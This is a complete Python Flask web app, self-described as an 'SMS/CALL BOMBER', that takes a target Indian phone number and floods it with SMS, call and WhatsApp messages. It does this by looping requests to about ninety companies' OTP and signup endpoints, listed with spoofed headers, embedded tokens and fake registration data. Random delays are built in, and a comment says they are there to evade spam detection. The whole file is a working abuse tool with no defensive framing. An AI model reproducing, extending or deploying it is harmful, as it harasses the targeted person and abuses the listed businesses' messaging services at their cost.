import threading
import time
import random
import requests
import urllib3
import os
from flask import Flask, jsonify, request, send_from_directory

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__, static_folder='.')

# ==================== ALL APIs ====================
ULTIMATE_APIS = [
    # CALL APIS
    {"name": "Careers360 Call", "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded",
     "X-Requested-With": "XMLHttpRequest"},
     "data": "mobile_number={phone}&method=call&uid=12692588", "type": "call"},

    # SMS APIS - TSUNAMI BOMBER
    {"name": "Hotstar", "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
     "method": "PUT", "headers": {"Content-Type": "application/json",
     "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"},
     "data": '{"phone_number":"{phone}","country_prefix":"91"}', "type": "sms"},
    {"name": "ALTBalaji", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
     "method": "POST", "headers": {"Content-Type": "application/json",
     "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36"},
     "data": '{"phone_number":"{phone}","country_code":"91","platform":"web","exp":1603915826710}', "type": "sms"},
    {"name": "Voot", "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
     "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8",
     "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36"},
     "data": '{"type":"mobile","mobile":"{phone}","countryCode":"+91"}', "type": "sms"},
    {"name": "SonyLIV", "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
     "method": "POST", "headers": {"Content-Type": "application/json",
     "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
     "x-via-device": "true", "app_version": "3.1.42.3",
     "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36"},
     "data": '{"mobileNumber":"{phone}","channelPartnerID":"MSMIND","country":"IN","timestamp":"2020-10-27T19:39:13.355Z"}', "type": "sms"},
    {"name": "Zee5", "url": "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}",
     "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None, "type": "sms"},
    {"name": "MedPlus", "url": "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": "recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&mobileNumber={phone}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false", "type": "sms"},
    {"name": "Apollo247", "url": "https://webapi.apollo247.com/",
     "method": "POST", "headers": {"Content-Type": "application/json",
     "Authorization": "Bearer 3d1833da7020e0602165529446587434"},
     "data": '{"operationName":"Login","variables":{"mobileNumber":"+91{phone}","loginType":"PATIENT"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\\n login(mobileNumber: $mobileNumber, loginType: $loginType) {\\nstatus\\nmessage\\nloginId\\n__typename\\n }\\n}\\n"}', "type": "sms"},
    {"name": "Netmeds", "url": "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
     "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None, "type": "sms"},
    {"name": "Flipkart", "url": "https://1.rome.api.flipkart.com/1/action/view",
     "method": "POST", "headers": {"Content-Type": "application/json",
     "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36"},
     "data": '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{phone}","loginType":"MOBILE","verificationType":"OTP"}}', "type": "sms"},
    {"name": "Zomato", "url": "https://www.zomato.com/webroutes/auth/login",
     "method": "POST", "headers": {"Content-Type": "application/json",
     "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36"},
     "data": '{"country_id":1,"phone":"{phone}","verification_type":"sms","method":"phone"}', "type": "sms"},
    {"name": "Cuemath", "url": "https://www.cuemath.com/api/v4/parents/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"intl_mobile":{"phone":"{phone}"},"phone":"{phone}","email":"tsunami@gmail.com","full_name":"Tsunami Bomber","timezone":"Asia/Calcutta","form_fields":"full_name,email,intl_mobile"}', "type": "sms"},
    {"name": "Dream11", "url": "https://www.dream11.com/graphql/mutation/pwa/register",
     "method": "POST", "headers": {"Content-Type": "application/json", "device": "pwa",
     "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
     "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36"},
     "data": '{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"tsunami@gmail.com","mobileNumber":"{phone}","password":"tsunami@123abc"}}', "type": "sms"},
    {"name": "Doubtnut", "url": "https://doubtnut.com/api/v1/user/login",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": "phone={phone}", "type": "sms"},
    {"name": "Vedantu", "url": "https://user.vedantu.com/user/preLoginVerification",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"email":null,"phoneCode":"+91","phoneNumber":"{phone}","ver":"11.345"}', "type": "sms"},
    {"name": "Unacademy", "url": "https://unacademy.com/api/v3/user/user_check/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"phone":"{phone}","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}', "type": "sms"},
    {"name": "Byjus", "url": "https://bcas-prod.byjusweb.com/api/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": "phoneNumber={phone}&page=free-trial-classes", "type": "sms"},
    {"name": "RedBus", "url": "https://m.redbus.in/api/getOtp?number={phone}&cc=91",
     "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None, "type": "sms"},
    {"name": "Coolwinks", "url": "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}",
     "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None, "type": "sms"},
    {"name": "Cansell", "url": "https://webapi.cansell.in/api/User/SignUp",
     "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8",
     "User-Agent": "Mozilla/5.0"},
     "data": '{"name":"Uwusjsj","surname":"wjeshs","email":"hsjs@gmail.com","phone":"{phone}","password":"eeeeee"}', "type": "sms"},
    {"name": "Gaana", "url": "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
     "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8",
     "appVersion": "8.9.0", "channel": "gaana.com", "platform": "android"},
     "data": '{"mobile":"+91-{phone}"}', "type": "sms"},
    {"name": "Ullu", "url": "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
     "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None, "type": "sms"},
    {"name": "Paytm", "url": "https://accounts.paytm.com/v2/api/register",
     "method": "POST", "headers": {"Content-Type": "application/json",
     "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36"},
     "data": '{"email":"","mobile":"{phone}","loginPassword":"Pura@1090","csrfToken":"f7ea628c-91a2-5f14-82ca-6f7eee295b1d","redirectUri":"https://paytm.com/v1/api/authresponse","clientId":"paytm-web-secure","scope":"paytm","state":"","responseType":"code","theme":"mp-html5","dob_agreement":true}', "type": "sms"},
    {"name": "Ogonn", "url": "https://ogonn.in/otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
     "X-Requested-With": "XMLHttpRequest"},
     "data": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}", "type": "sms"},
    {"name": "Swiggy", "url": "https://www.swiggy.com/mapi/auth/signup",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"name":"dbdbdbd","email":"tsunami@gmail.com","password":"sndndndbdj283jsbsbs","referral_code":"","mobile":"{phone}","_csrf":"jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}', "type": "sms"},
    {"name": "Ajio", "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
     "method": "POST", "headers": {"Content-Type": "application/json",
     "Origin": "https://www.ajio.com", "Referer": "https://www.ajio.com/signup",
     "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36"},
     "data": '{"firstName":"Tsunami Bomber","login":"tsunami@gmail.com","password":"kd34646@3131","genderType":"","mobileNumber":"{phone}","requestType":"SENDOTP"}', "type": "sms"},
    {"name": "BookMyShow", "url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"channel":"phone","subChannel":"sms","details":{"phone":"{phone}","origin":"https://in.bookmyshow.com"}}', "type": "sms"},
    {"name": "BigBasket", "url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"identifier":"{phone}"}', "type": "sms"},
    {"name": "Flomattress", "url": "https://cod.flomattress.com/api/otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": "number={phone}&store=hushbedding.myshopify.com", "type": "sms"},
    {"name": "Lenskart", "url": "https://api.lenskart.com/v2/customers/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8",
     "x-api-client": "mobilesite"},
     "data": '{"telephone":"{phone}"}', "type": "sms"},
    {"name": "UrbanClap", "url": "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
     "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"},
     "data": '{"country_id":"IND","phone":{"isd_code":"+91","phone_wo_isd":"{phone}"},"device_type":"customer"}', "type": "sms"},
    {"name": "OYO Rooms", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
     "method": "POST", "headers": {"Content-Type": "text/plain;charset=UTF-8"},
     "data": '{"phone":"{phone}","country_code":"+91","nod":4}', "type": "sms"},
    {"name": "Dominos", "url": "https://api.dominos.co.in/loginhandler/forgotpassword",
     "method": "POST", "headers": {"Content-Type": "application/json",
     "api_key": "d2aeb489bb8df385"},
     "data": '{"lastName":"","mobile":"{phone}","firstName":""}', "type": "sms"},
    {"name": "PizzaHut", "url": "https://api.pizzahut.io/v1/otp/generate",
     "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"},
     "data": '{"phone":"+91{phone}"}', "type": "sms"},
    {"name": "KFC", "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228",
     "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8",
     "Referer": "https://online.kfc.co.in/login",
     "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36"},
     "data": '{"phoneNumber":"{phone}","AuthorizedFor":"3","Resend":"false"}', "type": "sms"},
    {"name": "BurgerKing", "url": "https://consumer-apis.burgerking.in/api/v1/user/signUp",
     "method": "POST", "headers": {"Content-Type": "application/json",
     "appversion": "1.6", "platform": "web"},
     "data": '{"phone_no":{phone}}', "type": "sms"},
    {"name": "Dineout", "url": "https://www.dineout.co.in/xhrajaxrequest/user_signup",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
     "X-Requested-With": "XMLHttpRequest"},
     "data": "name=Tsunami+Bomber&phone={phone}", "type": "sms"},
    {"name": "Purplle", "url": "https://www.purplle.com/api/account/authorization/send_otp?phone={phone}&action=register",
     "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None, "type": "sms"},
    {"name": "AngelBroking", "url": "https://www.angelbroking.com/form-gateways/oda-form.php",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": "name=Tsunami+Bomber&mobile={phone}&city=pune&web_placement_id=21", "type": "sms"},
    {"name": "HappyEasyGo", "url": "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91{phone}&verifycode=FDCA",
     "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None, "type": "sms"},
    {"name": "Snapdeal", "url": "https://m.snapdeal.com/signupCompleteAjax",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
     "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36"},
     "data": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy", "type": "sms"},
    {"name": "Grofers", "url": "https://grofers.com/v2/accounts/",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded",
     "app_client": "consumer_web",
     "auth_key": "57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13"},
     "data": "user_phone={phone}", "type": "sms"},
    {"name": "Cilory", "url": "https://www.cilory.com/app/w/auth/soft",
     "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"},
     "data": '{"mobile":"{phone}"}', "type": "sms"},
    {"name": "GetInstaCash", "url": "https://getinstacash.in/sell/getData.php",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
     "X-Requested-With": "XMLHttpRequest"},
     "data": "type=sendOTP&mobile={phone}", "type": "sms"},

    # SMS - WEBSITE APIs
    {"name": "Lenskart v3", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"phoneCode":"+91","telephone":"{phone}"}', "type": "sms"},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": "phone={phone}&countryCode=IN", "type": "sms"},
    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"phone":"{phone}"}', "type": "sms"},
    {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}"}', "type": "sms"},
    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}', "type": "sms"},
    {"name": "Doubtnut v4", "url": "https://api.doubtnut.com/v4/student/login",
     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
     "data": '{"phone_number":"{phone}","language":"en"}', "type": "sms"},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
     "data": '{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}', "type": "sms"},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile_number":"+91{phone}"}', "type": "sms"},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"phone":"{phone}","city":362}', "type": "sms"},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobileNumber":"{phone}"}', "type": "sms"},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"phone":"{phone}","country":"in"}', "type": "sms"},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"phone":"{phone}","email":"test@example.com"}', "type": "sms"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": "mobile_no=%2B91{phone}", "type": "sms"},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": "mobile={phone}", "type": "sms"},
    {"name": "Tata Capital", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}', "type": "sms"},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}","hashCode":"k387IsBaTmn"}', "type": "sms"},
    {"name": "Housing", "url": "https://login.housing.com/api/v2/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"phone":"{phone}","country_url_name":"in"}', "type": "sms"},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"phone":"{phone}","app_signature":"wk+avHrHZf2"}', "type": "sms"},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}","isPlaycircle":false}', "type": "sms"},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}', "type": "sms"},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}', "type": "sms"},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}","deviceType":"website"}', "type": "sms"},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}","client_id":"kisan-app"}', "type": "sms"},
    {"name": "Spencers", "url": "https://jiffy.spencers.in/user/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}"}', "type": "sms"},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}","mfa_channels":"phno"}', "type": "sms"},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
     "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"},
     "data": '{"mobile":"{phone}"}', "type": "sms"},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}"}', "type": "sms"},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}"}', "type": "sms"},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}","locale":"IN"}', "type": "sms"},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}","hash_type":"play_store"}', "type": "sms"},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}"}', "type": "sms"},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}","isd_code":"91"}', "type": "sms"},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"mobile":"{phone}"}', "type": "sms"},

    # WHATSAPP APIS
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
     "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
     "content-type": "application/json; charset=UTF-8"},
     "data": '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}', "type": "whatsapp"},
    {"name": "Cuemath WhatsApp", "url": "https://www.cuemath.com/api/v4/parents/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": '{"intl_mobile":{"phone":"{phone}"},"notify":["notify_on_whatsapp"],"email":"tsunami@gmail.com","full_name":"Tsunami Bomber","timezone":"Asia/Calcutta","notify_through":"notify_on_whatsapp","form_fields":"full_name,email,intl_mobile"}', "type": "whatsapp"},
    {"name": "RedBus WhatsApp", "url": "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=true",
     "method": "GET", "headers": {}, "data": None, "type": "whatsapp"},

    # GET BASED APIS
    {"name": "Univest", "url": "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
     "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "Vyapar", "url": "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
     "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "WorkIndia", "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
     "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "ConfirmTkt", "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
     "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "MyGov", "url": "https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
     "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "BigCash", "url": "https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
     "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None, "type": "sms"},
    {"name": "CodFirm", "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
     "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "Jockey WhatsApp", "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
     "method": "GET", "headers": {}, "data": None, "type": "whatsapp"},
]

# ==================== GLOBAL STATE ====================
stats = {
    "running": False,
    "total_requests": 0,
    "successful_hits": 0,
    "failed_attempts": 0,
    "calls_sent": 0,
    "whatsapp_sent": 0,
    "sms_sent": 0,
    "start_time": 0,
    "logs": []
}

stats_lock = threading.Lock()


def add_log(message, log_type="info"):
    with stats_lock:
        timestamp = time.strftime("%H:%M:%S")
        stats["logs"].append(f"[{timestamp}] {message}")
        if len(stats["logs"]) > 100:
            stats["logs"] = stats["logs"][-100:]


def hit_api(api, phone):
    try:
        url = api["url"].replace("{phone}", phone)
        headers = dict(api.get("headers") or {})
        headers.setdefault("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36")

        data = api["data"].replace("{phone}", phone) if api["data"] else None

        method = api["method"].upper()
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=8, verify=False)
        elif method == "PUT":
            response = requests.put(url, headers=headers, data=data, timeout=8, verify=False)
        else:
            response = requests.post(url, headers=headers, data=data, timeout=8, verify=False)

        return response.status_code in [200, 201, 202, 204]
    except Exception:
        return False


def bombing_worker(api, phone):
    """Har API ka apna loop - continuous bombing"""
    while stats["running"]:
        with stats_lock:
            stats["total_requests"] += 1
            if api["type"] == "call":
                stats["calls_sent"] += 1
            elif api["type"] == "whatsapp":
                stats["whatsapp_sent"] += 1
            else:
                stats["sms_sent"] += 1

        success = hit_api(api, phone)

        with stats_lock:
            if success:
                stats["successful_hits"] += 1
                emoji = "📞" if api["type"] == "call" else ("📱" if api["type"] == "whatsapp" else "💬")
                add_log(f"{emoji} HIT: {api['name']} - SUCCESS! ({stats['successful_hits']})", "success")
            else:
                stats["failed_attempts"] += 1

        # 2-5 sec random delay per API (spam detection se bachne ke liye)
        time.sleep(random.uniform(2, 5))


@app.route("/")
def home():
    return send_from_directory(".", "index.html")


@app.route("/start", methods=["POST"])
def start_bombing():
    if stats["running"]:
        return jsonify({"status": "already_running"})

    phone = request.json.get("phone", "")
    mode = request.json.get("mode", "all")

    if not phone.isdigit() or len(phone) != 10:
        return jsonify({"status": "error", "message": "Invalid phone number"}), 400

    with stats_lock:
        stats["running"] = True
        stats["total_requests"] = 0
        stats["successful_hits"] = 0
        stats["failed_attempts"] = 0
        stats["calls_sent"] = 0
        stats["whatsapp_sent"] = 0
        stats["sms_sent"] = 0
        stats["start_time"] = time.time()
        stats["logs"] = []

    add_log(f"🚀 PRABHANJAN EXPLOITS STARTED!", "info")
    add_log(f"🎯 Target: +91{phone}", "info")
    add_log(f"💣 Mode: {mode.upper()}", "info")

    if mode == "sms":
        apis_to_use = [a for a in ULTIMATE_APIS if a["type"] == "sms"]
    elif mode == "call":
        apis_to_use = [a for a in ULTIMATE_APIS if a["type"] == "call"]
    elif mode == "whatsapp":
        apis_to_use = [a for a in ULTIMATE_APIS if a["type"] == "whatsapp"]
    else:
        apis_to_use = ULTIMATE_APIS

    add_log(f"⚡ Deploying {len(apis_to_use)} APIs!", "warn")

    # Har API ke liye ek thread start karo
    for api in apis_to_use:
        t = threading.Thread(target=bombing_worker, args=(api, phone), daemon=True)
        t.start()

    return jsonify({"status": "started", "apis": len(apis_to_use)})


@app.route("/stop", methods=["POST"])
def stop_bombing():
    stats["running"] = False
    add_log("🛑 ATTACK STOPPED BY USER!", "warn")
    return jsonify({"status": "stopped"})


@app.route("/stats", methods=["GET"])
def get_stats():
    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
    success_rate = (stats["successful_hits"] / stats["total_requests"] * 100) if stats["total_requests"] > 0 else 0

    return jsonify({
        "running": stats["running"],
        "sms_sent": stats["sms_sent"],
        "calls_sent": stats["calls_sent"],
        "whatsapp_sent": stats["whatsapp_sent"],
        "successful_hits": stats["successful_hits"],
        "total_requests": stats["total_requests"],
        "failed_attempts": stats["failed_attempts"],
        "success_rate": round(success_rate, 1),
        "elapsed": round(elapsed, 1),
        "logs": stats["logs"][-50:]
    })


# ==================== RENDER DEPLOYMENT SUPPORT ====================

if __name__ == "__main__":
    # Render PORT env variable use karta hai
    port = int(os.environ.get("PORT", 5000))
    print("=" * 50)
    print("💀 PRABHANJAN EXPLOITS - SMS/CALL BOMBER")
    print(f"🌍 Website: http://0.0.0.0:{port}")
    print("=" * 50)
    app.run(host="0.0.0.0", port=port, debug=False)

